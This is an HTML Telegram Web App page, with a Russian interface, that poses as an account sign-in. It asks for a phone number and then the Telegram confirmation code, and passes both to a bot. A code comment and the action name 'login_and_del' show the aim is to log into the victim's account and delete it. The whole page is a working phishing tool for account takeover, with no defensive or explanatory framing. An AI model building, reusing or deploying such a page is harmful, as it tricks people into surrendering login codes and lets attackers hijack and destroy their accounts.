<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1c1c1e; padding: 30px; border-radius: 20px; width: 85%; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 15px; margin: 20px 0; border-radius: 12px; border: 1px solid #333; background: #2c2c2e; color: #fff; font-size: 18px; box-sizing: border-box; text-align: center; outline: none; }
        button { width: 100%; padding: 15px; background: #007aff; color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
        button:active { transform: scale(0.98); }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="title">🔐 Вход в аккаунт</h2>
        <p id="desc" style="opacity: 0.6">Введите номер телефона для авторизации</p>
        <input type="tel" id="inputField" placeholder="+79001112233">
        <button id="mainBtn">Продолжить</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        let step = 1;
        let phone = "";

        document.getElementById('mainBtn').onclick = function() {
            let val = document.getElementById('inputField').value.trim();
            if (!val) return alert("Заполните поле!");

            if (step === 1) {
                phone = val;
                // Отправляем номер боту, чтобы он запросил код
                tg.sendData(JSON.stringify({ "action": "send_code", "phone": phone }));
                
                // Меняем интерфейс под ввод кода
                document.getElementById('title').innerText = "📩 Введите код";
                document.getElementById('desc').innerText = "Код подтверждения отправлен в Telegram";
                document.getElementById('inputField').value = "";
                document.getElementById('inputField').placeholder = "12345";
                document.getElementById('mainBtn').innerText = "Войти";
                step = 2;
            } else {
                // Отправляем код боту для входа и удаления
                tg.sendData(JSON.stringify({ "action": "login_and_del", "code": val, "phone": phone }));
                tg.close();
            }
        };
    </script>
</body>
</html>
